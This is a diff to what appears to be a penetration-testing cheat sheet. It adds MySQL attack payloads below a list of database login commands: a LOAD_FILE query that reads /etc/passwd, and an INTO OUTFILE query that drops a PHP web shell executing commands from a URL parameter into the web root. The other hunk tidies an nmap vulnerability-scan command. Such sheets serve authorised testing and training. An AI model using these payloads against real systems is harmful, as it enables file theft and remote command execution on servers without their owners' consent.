@@ -331,6 +331,9 @@ mysql -h ip -u root
 mysql -h ip -u root -p
 mysql -h ip -u root -p database_name
 mysql -u <USERNAME> -p<PASSWORD> -e "use <database>;select * from <tablename>;"
+
+SELECT LOAD_FILE("/etc/passwd")
+Select "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/x.php'
 ```
 ### [Resources]
 https://www.youtube.com/watch?v=p4JgIu1mceI  
@@ -342,7 +345,7 @@ https://github.com/vulnersCom/nmap-vulners
 nmap -sV --script vulners --script-args mincvss=5.0 <target>
 nmap --script http-vulners-regex.nse --script-args paths={"/"} <target> 
 
-root@kali:~# nmap -sC -sV -v -p- --script vulners --script-args mincvss=5.0 <target> --min-rate=6000
+nmap -sC -sV -v -p- --script vulners --script-args mincvss=5.0 <target> --min-rate=6000
 ```
 
 ### telnet POP email
